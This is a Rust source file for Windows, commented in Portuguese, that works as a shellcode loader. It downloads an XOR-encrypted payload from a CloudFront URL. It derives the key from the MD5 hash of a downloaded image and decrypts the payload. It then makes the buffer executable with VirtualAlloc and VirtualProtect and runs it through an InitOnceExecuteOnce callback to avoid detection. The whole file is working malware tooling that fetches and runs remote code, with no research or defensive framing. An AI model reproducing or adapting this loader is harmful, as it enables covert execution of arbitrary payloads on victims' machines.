extern crate winapi;
extern crate libc;

use winapi::shared::minwindef::LPVOID;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use std::ffi::CString;
use std::ptr;
use std::mem;
use libc::memcpy;
use reqwest;
use tokio;

//teste

unsafe extern "system" fn my_func(
    _run_once: *mut winapi::um::winnt::RTL_RUN_ONCE,
    parameter: LPVOID,
    context: *mut LPVOID,
) -> winapi::shared::ntdef::NTSTATUS {
    let param = CString::from_raw(parameter as *mut i8);
    println!("Parameter: {:?}", param);

    let buf: &Vec<u8> = &*(context as *const Vec<u8>);

    let address_pointer = VirtualAlloc(ptr::null_mut(), buf.len(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if address_pointer.is_null() {
        panic!("Failed to allocate memory");
    }

    memcpy(
        address_pointer as *mut libc::c_void,
        buf.as_ptr() as *const libc::c_void,
        buf.len(),
    );

    let mut fl_old_protect = 0;
    if VirtualProtect(address_pointer, buf.len(), PAGE_EXECUTE_READ, &mut fl_old_protect) == 0 {
        panic!("Failed to change memory protection");
    }

    let buf_fn: extern "C" fn() = mem::transmute(address_pointer);
    buf_fn();

    0
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let loader_url = "https://d3qlvo7dokg9tf.cloudfront.net/redsc";
    let image_url = "https://d3qlvo7dokg9tf.cloudfront.net/imagem.jpg";

    // Baixar e calcular o MD5 da imagem
    let xor_key = download_and_calculate_md5(image_url).await?;

    // Converta a chave XOR para uma string hexadecimal e imprima
    let xor_key_hex: String = xor_key.iter().map(|b| format!("{:02x}", b)).collect();
    println!("Chave XOR (MD5 de imagem.jpg): {}", xor_key_hex);

    // Baixar o payload criptografado
    let response = reqwest::get(loader_url).await.expect("Falha ao fazer a requisição");
    let encrypted_payload = response.bytes().await.expect("Falha ao ler os bytes");

    // Descriptografar o payload usando a chave MD5
    let buf: Vec<u8> = encrypted_payload.iter().zip(xor_key.iter().cycle()).map(|(&b, &k)| b ^ k).collect();

    unsafe {
        let mut rtl_run_once: winapi::um::winnt::RTL_RUN_ONCE = mem::zeroed();
        let param = CString::new("Hello World").unwrap();
        let context = &buf as *const Vec<u8> as *mut LPVOID;

        winapi::um::synchapi::InitOnceExecuteOnce(
            &mut rtl_run_once,
            Some(my_func),
            param.into_raw() as LPVOID,
            context,
        );

        // Esperar entrada para manter o programa aberto
        let _ = std::io::stdin().read_line(&mut String::new());
    }

    Ok(())
}

async fn download_and_calculate_md5(url: &str) -> Result<[u8; 16], Box<dyn std::error::Error>> {
    // Baixar a imagem
    let response = reqwest::get(url).await?;
    let bytes = response.bytes().await?;

    // Calcular o hash MD5
    let digest = md5::compute(&bytes);
    let mut key = [0u8; 16];
    key.copy_from_slice(&digest.0);

    Ok(key)
}
